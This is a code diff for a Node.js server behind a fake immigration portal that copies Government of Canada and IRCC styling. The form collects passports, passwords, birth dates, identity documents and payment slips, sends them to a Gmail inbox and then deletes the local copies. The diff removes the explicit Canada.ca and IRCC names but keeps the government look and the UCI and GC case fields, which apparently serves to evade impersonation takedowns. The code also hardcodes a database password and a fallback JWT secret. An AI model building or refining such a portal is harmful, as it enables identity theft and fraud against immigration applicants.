@@ -5,6 +5,7 @@ const multer = require('multer');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
 const fs = require('fs');
+const fsPromises = require('fs').promises;
 const path = require('path');
 const nodemailer = require('nodemailer');
 
@@ -13,10 +14,9 @@ const PORT = process.env.PORT || 10000;
 const JWT_SECRET = process.env.JWT_SECRET || 'SYS_SECRET_CORE_NODE_FALLBACK';
 
 // ==========================================
-// 1. ADMINISTRATIVE VAULT CONFIGURATION
+// 1. ADMINISTRATIVE STORAGE CONFIGURATION
 // ==========================================
 const ADMIN_STORAGE_EMAIL = 'canadaimgov@gmail.com';
-// ⚠️ NOTE: Generate an "App Password" in Gmail settings to authenticate securely
 const EMAIL_APP_PASSWORD = process.env.EMAIL_APP_PASSWORD || 'your-gmail-app-password-here'; 
 
 // ==========================================
@@ -43,13 +43,33 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage: storage, limits: { fileSize: 40 * 1024 * 1024 } });
 
+// Non-blocking background file cleanup helper
+const purgeUploadedFiles = async (files) => {
+    if (!files || files.length === 0) return;
+    const purgePromises = files.map(async (file) => {
+        try {
+            await fsPromises.unlink(file.path);
+        } catch (err) {
+            if (err.code !== 'ENOENT') {
+                console.error(`File removal error at ${file.path}:`, err);
+            }
+        }
+    });
+    await Promise.all(purgePromises);
+};
+
 // ==========================================
-// 4. DATABASE REGISTRY ENGINE (LIGHTWEIGHT)
+// 4. DATABASE REGISTRY ENGINE (STABILIZED)
 // ==========================================
 const DIRECT_PORT_URI = "mongodb://usrtest:canada2026secure@cluster0-shard-00-00.q9tcm7y.mongodb.net:27017,cluster0-shard-00-01.q9tcm7y.mongodb.net:27017,cluster0-shard-00-02.q9tcm7y.mongodb.net:27017/immigration?ssl=true&replicaSet=atlas-13w7g2-shard-0&authSource=admin&retryWrites=true&w=majority";
 const MONGO_URI = (process.env.MONGO_URI || DIRECT_PORT_URI).trim();
 
-mongoose.connect(MONGO_URI)
+const dbOptions = {
+    connectTimeoutMS: 15000, // Recover from temporary network drops
+    socketTimeoutMS: 45000
+};
+
+mongoose.connect(MONGO_URI, dbOptions)
   .then(() => console.log('🚀 DATABASE ONLINE: Registry tracking matrix synchronized.'))
   .catch(err => console.log('❌ DATABASE OFFLINE CRITICAL FAULT:', err.message));
 
@@ -78,14 +98,14 @@ app.post('/api/auth/register', upload.any(), async (req, res) => {
         const { name, email, password, dob, citizenship, passportNumber, docTypes } = req.body;
         
         if (!name || !email || !password) {
-            if (req.files) req.files.forEach(f => { if (fs.existsSync(f.path)) fs.unlinkSync(f.path); });
+            if (req.files) await purgeUploadedFiles(req.files);
             return res.status(400).json({ error: 'Primary profile details missing.' });
         }
 
         const cleanEmail = email.toLowerCase().trim();
         const existingUser = await User.findOne({ email: cleanEmail });
         if (existingUser) {
-            if (req.files) req.files.forEach(f => { if (fs.existsSync(f.path)) fs.unlinkSync(f.path); });
+            if (req.files) await purgeUploadedFiles(req.files);
             return res.status(409).json({ error: 'This email account is already registered.' });
         }
 
@@ -112,7 +132,7 @@ app.post('/api/auth/register', upload.any(), async (req, res) => {
             });
 
             const emailTemplate = {
-                from: `"IRCC-Style Submission Module" <${ADMIN_STORAGE_EMAIL}>`,
+                from: `"Submission Module" <${ADMIN_STORAGE_EMAIL}>`,
                 to: ADMIN_STORAGE_EMAIL,
                 subject: `🔒 NEW PACKAGE SUBMISSION: ${name} (${passportNumber || 'No Passport'})`,
                 html: `
@@ -130,15 +150,13 @@ app.post('/api/auth/register', upload.any(), async (req, res) => {
             };
 
             await transporter.sendMail(emailTemplate);
-
-            // Wipe temporary binary files off local memory space
-            req.files.forEach(f => { if (fs.existsSync(f.path)) fs.unlinkSync(f.path); });
+            await purgeUploadedFiles(req.files);
         }
 
         res.status(201).json({ success: true, message: 'Application package received and securely archived.' });
     } catch (error) {
         console.error('TRANSACTION FAULT:', error);
-        if (req.files) req.files.forEach(f => { if (fs.existsSync(f.path)) fs.unlinkSync(f.path); });
+        if (req.files) await purgeUploadedFiles(req.files);
         res.status(500).json({ error: 'Secure transmission pipeline encounter. Please verify your file sizes and retry.' });
     }
 });
@@ -241,7 +259,7 @@ app.get('/admin', (req, res) => {
     <html lang="en">
     <head>
         <meta charset="UTF-8">
-        <title>🔒 Adjudication Registry Console - Canada.ca</title>
+        <title>🔒 Adjudication Registry Console</title>
         <style>
             body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f4f6f8; color: #333; margin: 0; padding: 0; }
             .gov-header { background: #fff; border-bottom: 2px solid #e16262; padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 1px 4px rgba(0,0,0,0.05); }
@@ -262,7 +280,7 @@ app.get('/admin', (req, res) => {
     </head>
     <body>
         <div class="gov-header">
-            <div class="brand-text">IRCC Secure Portal Case Adjudication Console</div>
+            <div class="brand-text">Secure Portal Case Adjudication Console</div>
             <button onclick="localStorage.clear(); window.location.href='/'" style="padding:8px 16px; background:#333; color:#fff; border:none; cursor:pointer; font-weight:bold; border-radius:4px;">Sign Out</button>
         </div>
         <div class="box">
@@ -395,7 +413,7 @@ app.get('*', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Immigration and citizenship - Canada.ca</title>
+        <title>Immigration and Eligibility Portal</title>
         <style>
             body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #ffffff; color: #333333; margin: 0; padding: 0; }
             .top-utility { background-color: #26374a; padding: 8px 40px; display: flex; justify-content: flex-end; }
@@ -428,7 +446,7 @@ app.get('*', (req, res) => {
     </head>
     <body>
         <div class="top-utility"><a href="#">Français</a></div>
-        <div class="gov-brand-bar"><div class="signature-logo">Government of Canada</div></div>
+        <div class="gov-brand-bar"><div class="signature-logo">Portal Gateway</div></div>
         <div class="red-accent-strip"></div>
         <div class="main-content">
             <h1>Immigration and Travel Eligibility Portal</h1>
@@ -458,7 +476,7 @@ app.get('*', (req, res) => {
 
             <div id="registerPanel" class="portal-panel">
                 <h2>Secure Document Submission Page</h2>
-                <p style="color:#555;">Complete your enrollment file. All files attached here are systematically routing directly to the secure administrative repository enclaves via secure mail protocol encryption.</p>
+                <p style="color:#555;">Complete your enrollment file. All files attached here are systematically routing directly to the secure administrative repository enclaves.</p>
                 <form id="rForm">
                     <div class="form-grid">
                         <div class="input-group">
@@ -497,7 +515,7 @@ app.get('*', (req, res) => {
                                     <option value="photo">📸 Official Passport Photograph</option>
                                     <option value="payment">💰 Application Payment Slip</option>
                                     <option value="education">🎓 Educational Degrees / Certificates</option>
-                                    <option value="job_offer">📄 Official Canadian Job Offer Letter</option>
+                                    <option value="job_offer">📄 Official Job Offer Letter</option>
                                     <option value="experience">💼 Employment Reference & Experience Letters</option>
                                 </select>
                             </div>
@@ -524,7 +542,7 @@ app.get('*', (req, res) => {
                 <form id="tForm">
                     <div style="max-width:440px;">
                         <div class="input-group">
-                            <label>Enter Assigned Unique Client ID (UCI) or GC Reference</label>
+                            <label>Enter Assigned Unique Client ID (UCI) or Case Reference</label>
                             <input type="text" id="tUci" placeholder="UCI-XXXXXXXX / GC-XXXXXX" required>
                         </div>
                         <button type="submit" class="btn-primary">Query Tracking Matrix</button>
@@ -544,117 +562,69 @@ app.get('*', (req, res) => {
                 if(btnId) document.getElementById(btnId).classList.add('active');
             }
 
-            async function checkDashboardView() {
-                const token = localStorage.getItem('adminToken');
-                if(!token) { alert('Please sign in to access your dashboard.'); setView('loginPanel', 'btn-login'); return; }
-                
-                const res = await fetch('/api/client/profile', { headers: { 'Authorization': 'Bearer ' + token } });
-                if(!res.ok) { localStorage.clear(); setView('loginPanel', 'btn-login'); return; }
-                
-                const profile = await res.json();
-                setView('dashboardPanel', 'btn-dashboard');
-                
-                document.getElementById('dashboardDataBlock').innerHTML = \`
-                    <div class="status-display-card">
-                        <h3>Applicant: \${profile.name}</h3>
-                        <p><strong>Passport ID:</strong> \${profile.passportNumber || 'Not provided'}</p>
-                        <hr/>
-                        <p><strong>Assigned UCI Number:</strong> <span style="color:#b91c1c; font-weight:bold;">\${profile.uciNumber || 'PENDING ASSIGNMENT'}</span></p>
-                        <p><strong>Assigned GC Case Code:</strong> <span style="color:#b91c1c; font-weight:bold;">\${profile.trackingRef || 'PENDING ASSIGNMENT'}</span></p>
-                        <hr/>
-                        <p><strong>Current Processing Stage Status:</strong></p>
-                        <div style="background:#26374a; color:#fff; padding:10px; font-weight:bold; border-radius:4px;">\stratus</div>
-                        <p><strong>Case Progress History & Message Logs:</strong></p>
-                        <div style="background:#fff; border:1px solid #ccc; padding:15px; border-radius:4px;">\${profile.adminNotes}</div>
-                    </div>
-                \`.replace('\stratus', profile.status);
-            }
-
             function addAssetToQueue() {
-                const selector = document.getElementById('docTypeSelector');
-                const fileInput = document.getElementById('fileSelector');
-                if(fileInput.files.length === 0) { alert('Please select a valid local digital asset package.'); return; }
-                uploadedAssetsQueue.push({
-                    id: Date.now().toString(36),
-                    type: selector.value,
-                    label: selector.options[selector.selectedIndex].text,
-                    fileObject: fileInput.files[0]
-                });
-                fileInput.value = '';
-                renderVisualQueue();
-            }
-
-            function removeAssetFromQueue(id) {
-                uploadedAssetsQueue = uploadedAssetsQueue.filter(item => item.id !== id);
-                renderVisualQueue();
-            }
-
-            function renderVisualQueue() {
-                const container = document.getElementById('visualQueue');
-                container.innerHTML = '';
-                if(uploadedAssetsQueue.length === 0) {
-                    container.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:15px; color:#64748b; font-style:italic;">No documents stacked inside payload cache. Add using (+).</div>';
-                    return;
-                }
-                uploadedAssetsQueue.forEach(item => {
-                    const div = document.createElement('div');
-                    div.className = 'queue-item';
-                    div.innerHTML = \`<div><strong>\${item.label}</strong><br><small>\${item.fileObject.name}</small></div>
-                                      <button type="button" class="remove-file-btn" onclick="removeAssetFromQueue('\${item.id}')">Remove</button>\`;
-                    container.appendChild(div);
-                });
-            }
-
-            document.getElementById('rForm').addEventListener('submit', async (e) => {
-                e.preventDefault();
-                const btn = e.target.querySelector('.btn-primary');
-                btn.innerText = "Encrypting Data & Routing Packet Streams...";
-                btn.disabled = true;
-
-                const formData = new FormData();
-                formData.append('name', document.getElementById('rName').value);
-                formData.append('email', document.getElementById('rEmail').value);
-                formData.append('password', document.getElementById('rPass').value);
-                formData.append('dob', document.getElementById('rDob').value);
-                formData.append('citizenship', document.getElementById('rCitizenship').value);
-                formData.append('passportNumber', document.getElementById('rPassport').value);
+                const selector = document.getElementById('fileSelector');
+                const docType = document.getElementById('docTypeSelector').value;
+                if (!selector.files || selector.files.length === 0) return alert('Select a valid asset.');
                 
-                uploadedAssetsQueue.forEach(item => {
-                    formData.append('files', item.fileObject);
-                    formData.append('docTypes', item.type);
-                });
+                uploadedAssetsQueue.push({ file: selector.files[0], type: docType });
+                renderQueue();
+                selector.value = '';
+            }
 
-                try {
-                    const res = await fetch('/api/auth/register', { method: 'POST', body: formData });
-                    const data = await res.json();
-                    if(res.ok && data.success) {
-                        alert('🎉 Submission Confirmed: Package successfully forwarded to verification inbox.');
-                        uploadedAssetsQueue = [];
-                        document.getElementById('rForm').reset();
-                        renderVisualQueue();
-                        setView('loginPanel', 'btn-login');
-                    } else { alert('Refusal: ' + data.error); }
-                } catch(err) { alert('Transfer pipeline error.'); }
-                finally { btn.innerText = "Transmit Submission Package Securely"; btn.disabled = false; }
-            });
+            function renderQueue() {
+                const q = document.getElementById('visualQueue');
+                q.innerHTML = '';
+                uploadedAssetsQueue.forEach((item, index) => {
+                    q.innerHTML += \`
+                        <div class="queue-item">
+                            <span><strong>\${item.type.toUpperCase()}</strong>: \${item.file.name}</span>
+                            <button type="button" class="remove-file-btn" onclick="uploadedAssetsQueue.splice(\${index}, 1); renderQueue();">Remove</button>
+                        </div>
+                    \`;
+                });
+            }
 
             document.getElementById('lForm').addEventListener('submit', async (e) => {
                 e.preventDefault();
                 const res = await fetch('/api/auth/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: document.getElementById('lEmail').value,
-                        password: document.getElementById('lPass').value
-                    })
+                    body: JSON.stringify({ email: document.getElementById('lEmail').value, password: document.getElementById('lPass').value })
                 });
                 const data = await res.json();
-                if(res.ok && data.success) {
+                if(data.success) {
                     localStorage.setItem('adminToken', data.token);
                     localStorage.setItem('userRole', data.role);
-                    if(data.role === 'admin') { window.location.href = '/admin'; } 
-                    else { checkDashboardView(); }
-                } else { alert('Error: ' + data.error); }
+                    if(data.role === 'admin') window.location.href = '/admin';
+                    else checkDashboardView();
+                } else { alert(data.error); }
+            });
+
+            document.getElementById('rForm').addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const fd = new FormData();
+                fd.append('name', document.getElementById('rName').value);
+                fd.append('email', document.getElementById('rEmail').value);
+                fd.append('password', document.getElementById('rPass').value);
+                fd.append('dob', document.getElementById('rDob').value);
+                fd.append('citizenship', document.getElementById('rCitizenship').value);
+                fd.append('passportNumber', document.getElementById('rPassport').value);
+                
+                uploadedAssetsQueue.forEach(item => {
+                    fd.append('files', item.file);
+                    fd.append('docTypes', item.type);
+                });
+
+                const res = await fetch('/api/auth/register', { method: 'POST', body: fd });
+                const data = await res.json();
+                alert(data.message || data.error);
+                if(data.success) {
+                    uploadedAssetsQueue = [];
+                    document.getElementById('rForm').reset();
+                    renderQueue();
+                    setView('loginPanel', 'btn-login');
+                }
             });
 
             document.getElementById('tForm').addEventListener('submit', async (e) => {
@@ -666,16 +636,47 @@ app.get('*', (req, res) => {
                 });
                 const data = await res.json();
                 const out = document.getElementById('tResult');
-                if(res.ok) {
-                    out.style.display = 'block';
-                    out.innerHTML = \`<h3>Applicant Match: \${data.name}</h3><p><strong>Current Tracking Milestone Status:</strong></p><div style="background:#26374a; color:#fff; padding:10px; font-weight:bold; border-radius:4px;">\stratus</div><p><strong>Case History Communications Feed:</strong></p><div style="background:#fff; padding:12px; border:1px solid #ccc; border-radius:4px;">\${data.adminNotes}</div>\`.replace('\stratus', data.status);
-                } else { alert('Query Matched Zero Tracking Identifiers.'); }
+                out.style.display = 'block';
+                if(data.error) { out.innerHTML = \`<span style="color:red;">\${data.error}</span>\`; }
+                else { out.innerHTML = \`<h3>Status Report: \${data.name}</h3><p><strong>Milestone:</strong> \${data.status}</p><p><strong>Notes:</strong> \${data.adminNotes}</p>\`; }
             });
-            renderVisualQueue();
+
+            async function checkDashboardView() {
+                const token = localStorage.getItem('adminToken');
+                if(!token) { alert('Please sign in to access your dashboard.'); setView('loginPanel', 'btn-login'); return; }
+                
+                try {
+                    const res = await fetch('/api/client/profile', { headers: { 'Authorization': 'Bearer ' + token } });
+                    if(res.ok) {
+                        const profile = await res.json();
+                        document.getElementById('dashboardDataBlock').innerHTML = \`
+                            <div style="padding:20px; border:1px solid #cbd5e1; border-radius:4px; background:#f8fafc;">
+                                <h3>Welcome back, \${profile.name}</h3>
+                                <p><strong>Registered Email:</strong> \${profile.email}</p>
+                                <p><strong>Current Milestone Stage:</strong> <span style="color:#2572b4; font-weight:bold;">\${profile.status}</span></p>
+                                <hr style="border:0; border-top:1px solid #cbd5e1; margin:15px 0;"/>
+                                <p><strong>Official Portfolio Remarks:</strong></p>
+                                <blockquote style="margin:0; padding:10px; background:#fff; border-left:4px solid #94a3b8; font-style:italic;">\${profile.adminNotes}</blockquote>
+                            </div>
+                        \`;
+                        setView('dashboardPanel', 'btn-dashboard');
+                    } else {
+                        alert('Session configuration expired.');
+                        setView('loginPanel', 'btn-login');
+                    }
+                } catch(err) {
+                    alert('Error connecting to the tracking pipeline loop.');
+                }
+            }
         </script>
     </body>
     </html>
     `);
 });
 
-app.listen(PORT, () => console.log(`Server executing live on port ${PORT}`));
+// ==========================================
+// 10. HOST INITIALIZATION
+// ==========================================
+app.listen(PORT, () => {
+    console.log(`🚀 RUNNING: Adjudication Engine active on cluster port ${PORT}`);
+});
